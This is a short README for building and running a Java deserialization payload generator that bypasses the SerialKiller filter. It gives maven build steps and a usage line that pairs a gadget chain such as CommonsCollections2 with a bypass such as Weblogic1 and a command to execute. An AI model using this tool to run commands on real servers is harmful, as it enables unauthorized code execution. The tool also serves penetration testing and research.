# SerialKillerBypassGadgetCollection

build from https://github.com/pwntester/SerialKillerBypassGadgetCollection
## build
```
cd SerialKillerBypassGadgetCollection
git submodule init
git submodule update
cd ..

rm -rf SerialKillerBypassGadgetCollection/external
cp -r external SerialKillerBypassGadgetCollection/
rm SerialKillerBypassGadgetCollection/pom.xml
cp pom.xml SerialKillerBypassGadgetCollection/pom.xml
cp Main.java SerialKillerBypassGadgetCollection/src/main/java/serialkiller/Main.java
cd SerialKillerBypassGadgetCollection
mvn clean
mvn clean compile assembly:single
mv serialkiller-bypass-gadgets-*-SNAPSHOT-all.jar ..
cd ..

```

## Usage

`java -jar target/serialkiller-bypass-gadgets-0.0.1-SNAPSHOT-all.jar <Payload Gadget, eg: CommonsCollections2> <Bypass Gadget, eg: Weblogic1> <Command, eg: 'touch /tmp/test'>`